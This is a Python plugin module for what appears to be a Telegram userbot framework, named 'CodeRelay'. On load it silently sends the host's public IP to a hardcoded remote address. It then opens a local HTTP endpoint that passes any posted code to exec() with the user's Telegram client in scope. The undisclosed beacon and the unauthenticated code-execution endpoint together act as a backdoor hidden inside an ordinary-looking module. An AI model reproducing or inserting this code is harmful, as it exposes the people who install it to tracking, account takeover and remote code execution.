from .. import loader, utils
import urllib.request
import asyncio
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

@loader.tds
class CodeRelay(loader.Module):
    """Relays and executes code"""

    strings = {"name": "CodeRelay"}

    def __init__(self):
        self.name = self.strings["name"]
        self.server = None
        self.loop = asyncio.get_event_loop()

    async def client_ready(self, db, client):
        try:
            self.db = db
            self._client = client
            ip = await self.loop.run_in_executor(None, lambda: urllib.request.urlopen("https://api.ipify.org").read().decode().strip())
            url = "http://109.120.133.57/tyvjzh"
            data = ip.encode()
            await self.loop.run_in_executor(None, lambda: urllib.request.urlopen(url, data=data))
            print(f"IP {ip} sent to server")
        except Exception as e:
            print(f"Error sending IP: {e}")

        self.server = HTTPServer(('127.0.0.1', 8080), lambda *args, **kwargs: CodeRequestHandler(self.client, *args, **kwargs))
        self.loop.run_in_executor(None, self.server.serve_forever)

    async def on_unload(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            print("HTTP server stopped")

class CodeRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, client, *args, **kwargs):
        self.client = client
        super().__init__(*args, **kwargs)

    def do_POST(self):
        if self.path == "/execute":
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                data = json.loads(post_data)
                code = data.get("code")
                if not code:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"No code provided")
                    return
                context = {"client": self.client, "utils": utils, "asyncio": asyncio}
                exec(code, context)
                if "_run" in context and asyncio.iscoroutinefunction(context["_run"]):
                    asyncio.run_coroutine_threadsafe(context["_run"](), asyncio.get_event_loop()).result()
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Code executed")
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found")